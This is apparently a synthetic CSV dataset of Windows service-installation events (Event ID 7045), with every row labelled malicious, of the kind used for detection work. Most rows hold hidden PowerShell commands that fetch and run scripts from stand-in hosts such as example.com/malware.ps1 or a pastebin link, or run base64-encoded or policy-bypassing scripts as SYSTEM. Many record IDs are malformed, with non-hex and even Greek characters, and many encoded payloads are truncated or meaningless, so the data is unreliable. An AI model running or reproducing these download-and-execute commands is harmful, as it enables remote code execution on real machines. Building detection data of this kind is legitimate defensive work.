Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBwAHIAbwB1AHAAcgBvAGMA...,Own Process,Auto Start,LocalSystem,4KpL8,2024-08-22T06:45:12.219Z,3e4d261a-1dcb-4f4e-8e6f-97b34e2ax
malicious,7045,SVCH0ST,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAcgBlAHcA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4LpM8,2024-03-20T08:41:19.219Z,2b544a65-1e32-49c5-b7a2-4210c9f0f84ax
malicious,7045,SuspiciousStartup,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAYwB... ( encoded command ),Own Process,Auto Start,LocalSystem,tG4,2024-08-20T08:41:12.219Z,42f51f8c-1234-4422-9a87-1a2b3c4d5ex
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,MlF4xG,2024-07-22T03:46:53.219Z,4a983a14-92f7-4c9a-8a15-2c4e5f6gx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,tG4kL,2024-08-22T10:41:18.219Z,4a85cd2-1a65-4b92-85asrwe-9c6e2c1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4kLp,2024-03-22T08:45:12.192Z,3b4a91f3-142d-47e8-8a22-5c781c98f14xx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -nop -c ""IEX ((New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,4HK3dL,2024-08-20T06:45:12.192Z,43a211f4-9b51-4f63-82c4-341c6b08009fx
malicious,7045,UpdateSvc32,%windir%\system32\cmd.exe /c powershell -exec bypass -f %temp%\svchost.exe,Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx4KqR,2024-03-10T18:45:12.219Z,43d7f4a2-2c91-4b15-8e2d-b75de8d76f1x
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAbgBkAGUAYwAgAGYAbwAuAGUAcwBwAHIAbwBpAG4AZABvAHcAcAByAGUAbgBkAGUAYwAgAGYAbwAuAGUAcwBwAHIAbwBpAG4AZABvAHcAcAByAGUAbgBkAGUAYwAgAGYAbwAuAGUAcwBwAHIAbwBpAG4AZABvAHcAcAByAGUAbgBkAGUAYwAgAGYAbwAuAGUAcwBwAHIAbwBpAG4AZABvAHcAcAByAGUAbgBkAGUAYwAgAGYAbwAuAGUAcwBwAHIAbwBpAG4AZABvAHcAcAByAGUAbgBkAGU,Own Process,Auto Start,LocalSystem,Gx4Kda,2024-09-01T08:45:21.219Z,2468c5a2-541f-4b2a-85f1-4d3a19f8x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBwAG8AcwB0AGEAbQBlACAAIgBoAHQAdABwADoALwAvAGYAbwByAG0AYQB0AGkAbwBuAC4AZQB4AGUAIgANAAoA,Own Process,Auto Start,LocalSystem,4kGpL,2024-08-22T03:45:10.219Z,2f1d4a5e-4f7a-4421-9d2f-g3j1nmx
malicious,7045,HiddenUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""iex (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4Kq,2024-03-22T10:45:12.192Z,43ec37a5-4b93-4f6c-b2a1-f8g79f1d4x
malicious,7045,UpdateAssistant,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Demand Start,NT AUTHORITY\SYSTEM,a7K3p,2024-08-21T03:45:10.219Z,37b421e7-9c48-463b-8e6c-5f2348d9ax
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\Music\update.ps1""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,xX4Kp,2024-08-22T10:15:32.219Z,4f51d6e7-9e4c-42c9-b3d5-4321e4c7x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AIgA7ACAAJABpACwAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACgAJABpACwAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACgAKA,Own Process,Auto Start,LocalService,KpQe8,2024-02-20T03:47:11.219Z,4c678521-1a4f-43b5-9df2-81a3bf74e2fx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,F4kGp,2024-09-02T06:14:22.191Z,3b5a1f7a-9d8c-4723-a8c1-1a8e4c7dx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c ""powershell -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aJ4KpL,2024-08-20T03:45:12.219Z,4f679d4e-1a3f-4128-b234-9a8gfc6x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c start /b /min powershell -exec bypass -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Auto Start,LocalSystem,4KuJ9a,2024-09-01T08:45:23.192Z,4a8f4b2e-1234-4321-ba56-8c0f3e7c8d5x
malicious,7045,DarkSideService,"%windir%\system32\cmd.exe /c ""powershell -w hidden -nop -c IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,kJ4B,2024-08-20T07:12:42.192Z,42fea451-95f4-49c8-ae74-43a7f6dxxxxx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,G8Kq2a,2024-03-22T08:41:19.421Z,4d78b71a-1324-4abe-af62-9d57cb6ax
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Lp,2024-09-02T08:45:12.192Z,4f92d5e1-2a79-498a-bd35-6a5f43ex
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -exec bypass -f C:\Users\Public\update.ps1""",Own Process,Demand Start,NT AUTHORITY\LOCAL SERVICE,4SDFg,2024-07-22T10:45:12.219Z,4e6a3b2a-511c-498d-8e5b-1234567890abx
malicious,7045,SuspiciousAgent,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAG4AZQBuAHQAaQBvAG4AIAAvAGMAaQB0AHQAZQBzAHQ,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdLp,2024-07-22T03:45:21.219Z,8fbae3c4-6d2b-4a8f-ba4d-1234567890x
malicious,7045,BackdoorAgent,%windir%\system32\cmd.exe /c powershell -enc JABzAD0AWwBpAG4AZABlAGMA ...,Own Process,Auto Start,LocalSystem,4zJ9a,2024-07-22T08:45:12.019Z,6a47fd9c-21a8-44c3-82ea-4562a5b0387ax
malicious,7045,UpdaterSvc,"%windir%\system32\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command ""& {Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\Windows\Temp\svchost.exe}""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,eKwLp,2024-08-20T08:45:12.219Z,4c2a5419-6f7d-4211-9b87-23456abcdefx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4HKqf,2024-03-10T08:41:19.021Z,5a94e9d5-51b4-4e35-9c7a-9515a4abf9x
malicious,7045,SvchostsUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAdwB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KpG,2024-09-01T08:45:12.219Z,4c56a3d1-f3b1-4e9a-a122-46f3b1x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAYQBzAHQAaQBvAG4A,Own Process,Auto Start,LocalSystem,GpT9f,2024-03-22T08:41:17.982Z,4a381e3d-2e9b-47c2-82ed-4eab3f5ba94dx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwBvAG0AcABcAGEAbgBkACAA,Own Process,Auto Start,LocalSystem,4kBp,2024-07-22T08:41:19.219Z,3fda83bc-7421-4198-ba95-23456abcx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -enc JABzAGUAYwB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,a7Kxp9,2024-02-20T07:41:12.219Z,43a21f4c-1e32-4b56-8d92-23456fghx
malicious,7045,HiddenUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop ...,Share Process,Demand Start,NT AUTHORITY\SYSTEM,4dK8a,2024-08-20T08:41:22.192Z,2f9853d4-1e2c-4b85-93a2-4e6b17ax
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,LocalService,4SdJ9,2024-09-01T08:45:21.219Z,3fda16b9-4c9d-49a3-8ae4-bx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIA...,Own Process,Auto Start,LocalSystem,4pL9a,2024-08-22T06:14:21.219Z,31f73c5d-1a34-4125-b2c1-9d87a34a2bc6x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SgP7d,2024-02-20T07:42:19.421Z,53a7f431-1e3d-479d-b5a2-e514c0e8x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAGMAYQB0AGUAIAB8ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAH0ACgAKABzAGUAYwB0ACAAcwB0AHIAZQBhAGMAUABpAG4AZwB0AGgA,Own Process,Auto Start,LocalSystem,kJ4B,2024-08-22T08:45:12.219Z,38f91c25-45a7-4282-91d4-7a6b12c9xx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,4SBgR,2024-03-22T08:41:19.219Z,4a513d2f-6a15-4f8c-9f6a-23b4a7h6gx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc ...,Own Process,Auto Start,LocalSystem,4KtRg,2024-09-01T03:45:12.219Z,4e384a65-2e71-4e98-b23f-fg87654321x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,AzLp,2024-03-22T08:41:19.421Z,85f31a54-2198-4e5a-9c12-87gthr45x
malicious,7045,TempService32,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX(New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\LocalService,kJ4x,2024-07-22T10:41:19.019Z,3f1b35c8-ea71-42a4-8e91-1f3341c8d2ax
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -enc aQBlAHgAIAAkAGUAbgB0AGUAcgBlAGYAbwByAGUAcwAuAGUAeABwAHIAZQBzAHUAcgBlAGYAbwByAGUAcwAuAGUAeABwAHIAaQB2AGUAYQB0AG8AcgBlAGYAbwByAGUAcwAuAGUAeABwAHIA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,L7sLJ,2024-02-22T11:49:01.421Z,43a2f91e-25e9-4c9f-b1a6-e5c17b8c6f4ax
malicious,7045,SuspiciousUpdater,cmd.exe /c powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAeQBzAHQAZQBtAGUATgBnACgAKQA=,Own Process,Demand Start,LocalService,aG9zdA,2024-09-01T08:42:19.219Z,42f71a6d-23e1-4d6f-a3f1-
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBTAHQAYQByAHQApQBvAG0AYgBvAHIAZQBhAG0AQwBvAHUAdABpAG4AZwB1AHIAaQB2AGUAcgBlAG4AYwBvAHQAaQB2AGUAbgB0ACgAKABmAGUAYwBhAHQAcwB1AHIAZQB2AGUAcgBlAG4AYwBvAHQAaQB2AGUAbgB0ACgA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SDFG,2024-03-22T19:47:12.219Z,42a3f19c-9f6e-4123-8d14-241a9bf44a7fx
malicious,7045,UpdaterSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGMAcgBvAHMAaABlAGwAbwBvAHcAZQByAHMAaABlAGwAbwBvAHcA...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SDF,2024-07-22T03:41:19.421Z,43f8c9a1-4a9e-4e6b-b1d5-849d43f7c56x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAApAC4AVwBpAG4AZABvAHcAcwBcAFQAZQBuAHQAXQA6ADoAcAB3AFAAcgBvAHgAeQAgAD0AIAB8ACAAcwB0AHIAZQBhAG0ALgBlAHgAZQAnAH0AZQBsAHMAZQBjAHYAZQByAHkAcwB2AHUAZAA-,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4S3K,2024-09-02T08:45:12.192Z,2a6f9a5d-4e8f-42a2-b1d3-8f34e312f4bx
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBkAD0AfQA=,Own Process,Auto Start,LocalSystem,aWxZ,2024-08-20T07:41:22.219Z,4f8c55b7-2319-4a1c-b2d8-fg7hjklx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,4kGpL,2024-02-20T11:46:21.192Z,4a8f9d92-3421-49c3-8a4e-2c522ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAG...,Own Process,Auto Start,LocalSystem,aG43d,2024-08-20T03:15:27.192Z,4f65a23d-1a6c-42b9-8a5f-3c18b13a2f4cx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdRg,2024-07-22T16:45:12.219Z,83a415d1-2198-4a51-9bff-8d3c4d6ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc SQBmAC...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SfL8a,2024-09-01T10:45:21.219Z,4e7b82d1-fa43-44de-9f9d-fgytrewx
malicious,7045,DarkShadow,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://pastebin.com raw.php?i=mz7G3N')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KtRd,2024-08-20T08:45:12.192Z,375aeec2-9f4a-43a9-b21f-8a6a2c7d23f9x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4KqN,2024-08-19T08:41:22.192Z,4d21a7e7-6b47-4f3c-9a2e-ειτουργ8hx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://example[.]com/malware')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,k4GpL,2024-08-20T09:41:12.219Z,539fedb4-23a9-4c6e-b14a-93asrwe-341dfgCx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAdAAtAFcAaQBuAGQAbwB3AG4AbwBwAHkAcwB0AHIAZQBhAGMAaABlAGwAbABvAHMAdAA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KgP7,2024-06-27T08:45:12.192Z,2b8f5a3c-1a34-4123-9bc4-27795bf9cfx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1')),Own Process,Demand Start,NT AUTHORITY\SYSTEM,4K7hG,2024-07-22T09:45:12.192Z,3b6f4552-1a85-4d42-bf8c-92e3f4a79e8x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAHMAaQBjAG8AbgBkAHMAaQBjAG8AbgBkAC,Own Process,Auto Start,LocalSystem,aG4Kp,2024-08-22T08:41:19.219Z,35162f51-4b23-4121-ba95-47a3cd1c4x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,4K9z,2024-08-22T08:45:21.219Z,7b91a21e-bf45-4598-8b9f-fgy5thjklx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AbQB4AGw ...,Own Process,Auto Start,LocalSystem,GpEg,2024-03-10T06:14:21.191Z,3fba87d4-2519-49b5-8f73-2d51e4f2478x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4lKpG,2024-07-22T03:45:19.219Z,43f21a94-9d5a-41a2-8c9f-4d7sdf2cxx
malicious,7045,SuspiciousAgent,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpG8d,2024-02-22T11:14:22.191Z,4f21b6c4-21a9-49e3-a98d-8122c9b16f4bx
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -e JAAoACAAJABkAGUAbgB0AG8AawBlACAALQBuAGUAIAAnAGgAdAB0AHAAcwA6AC8ALwByAGUAYwB0AG8AcgBpAGcAaAB0AHQAcAA6AC8ALwB3AHkAYwB0AGEAcwBzAHcAbwByAGQA,Own Process,Auto Start,LocalSystem,a4K2,2024-08-22T03:14:21.192Z,4c3a4e8e-2b71-41f5-9a3c-fg7hj4k2lx
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,Gp4L8,2024-08-22T09:45:12.192Z,6f43a5e2-1d7a-4123-9c67-89a23f1ax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c ""powershell -ep bypass -w hidden -c IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-09-01T08:45:12.192Z,43a12e9d-45b7-4671-ba12-34cd56fghx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\Malware.ps1""",Own Process,Demand Start,LocalService,GxJ4l,2024-08-22T08:45:12.219Z,3b5a71d2-4152-4c9f-8f
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAG4AYQBtAGEAaQBsAGUAcgBlAG4AYwBvAGQAaQBuAGcAJwBpAG4AZABzAGMAawBlAGQAZQBuAGcAJwBpAG4AZABzAGMAawBlAGMAaABhAG4AZAAoACcAaAB0AHQAcAA6AC8ALwB3AGUAcgB0AHUAYQBsAGkAYwBlAHMAcwBpAG4AYQBsAGwAYQBuAGcA,Own Process,Auto Start,LocalSystem,4sGK,2024-03-21T08:45:12.219Z,4c2a56d4-2f3a-42a1-9a4c-85b6c7d8e9fx
malicious,7045,UpdateSvc32,%windir%\system32\cmd.exe /c start /b /min powershell -ep bypass -nop -w hidden IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Auto Start,LocalSystem,a4KpL9,2024-03-22T08:41:19.219Z,43a6f71d-92c5-4a46-9d8a-cf9f6a1728b5x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell.exe -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4K3pL,2024-08-20T10:45:12.219Z,38f762d5-4a54-4123-9gfrt-azcxvbnmx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c start /b /min powershell.exe -enc JABzAGUAYwBhAGQAZQByACAAPQAgACgAWwBjAGgAYQByAF0ANgA0AFMAdAByAGUAYQBtAGUAcgBzAGUAXQA6ADoAVABlAG4AdgBpAHAAdQBzAGUAKQAgAH0ADQAKAA==,Own Process,Demand Start,LocalService,aG4K8,2024-02-22T08:41:12.192Z,4c87bda9-1a32-419f-b3af-219d5c27cxx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aGpH,2024-08-22T07:41:12.192Z,3fda81a4-5b19-4123-85g2-1sdfwe32x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -enc JABlAHgAZQAnAH...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4xKpG,2024-08-20T10:45:12.192Z,5a3d7f51-2b6c-49c8-afb4-3f7d9a65x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,aZ4k,2024-08-20T10:45:12.219Z,3b6a5e91-45d2-4f3a-9d8f-2g1h4j5k6x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,t9aQ,2024-08-20T08:41:22.191Z,4a721e5c-85d7-4f2d-ba47-83ca5e9c2x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -w hidden -e JABlAHMAYgBsAGUAYQBkAGUAbQBlAG4AYwBvAG4A,Own Process,Auto Start,LocalSystem,p8K7z,2024-08-20T11:45:12.219Z,43a9f5d1-7b37-49c5-b23d-fg6t5a4gx
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -enc JABzAGUAcgBlAGYAcgBvAG0AYQBuAGEAbQBlACgAKABmAG8AcgBtAGEAYwBrAC8AdwB3AHcALgBwAHMAMQAnACkALgBHAGUAbQBlAG4AdAAuAHcAZQBiAGwAaQBjACgAKABmAG8AcgAuAGMAbwBtAHAAbwB3AGUAcgBzAGgAbwB1AGwAZQB0AC4AYwBvAG0ALwBhAHQAYwBoACgAKABmAG8AcgBtAGEAYwBrAC8AdwB3AHcALgBwAHMAMQAnACkALgBHAGUAbQBlAG4AdAAuAHcAZQBiAGwAaQBj,Own Process,Auto Start,NT AUTHORITY\SYSTEM,gR4D,2024-09-01T08:45:12.219Z,4c2a5b8f-021d-4d4a-8e9b-f1a356c23e6fx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgA,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4pL3x,2024-08-20T08:45:12.219Z,3f7a42e3-219c-4571-92c4-251f68aax
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -enc aQBlAHgAIAAoACQ...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KpL8,2024-08-20T08:41:22.191Z,43a21fcb-821e-4d5f-8e62-351fhpqdx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAYQB0AG8A...,Own Process,Auto Start,LocalService,kGpL4a,2024-08-20T08:41:19.212Z,4f2a7b9c-1c45-42a8-b123-fg6hjklmnox
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c start /b /min powershell -ep bypass -nop -w hidden IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Demand Start,NT AUTHORITY\SYSTEM,4pRt,2024-08-22T07:41:19.123Z,4de4f952-2f6b-4e2a-8b11-6b145e3ax
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,aG4K,2024-08-22T06:14:21.123Z,3fda51d2-41a5-442f-b3f7-93a1b2c9d7x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -w hidden -enc aQBlAHgAIAAkAGQA...,Own Process,Auto Start,LocalSystem,KpQ4r,2024-03-22T10:45:12.192Z,43a8f551-2b41-46c9-ba8e-51f4w357x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4K7d,2024-08-20T08:45:12.219Z,45e3f691-92f8-4f35-9d8e-4e8aeb7a2c4x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\Documents\script.ps1,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4sGpL,2024-08-20T03:47:15.219Z,6ba5f36d-2d5c-4a31-8d3a-1fcb49b17ax
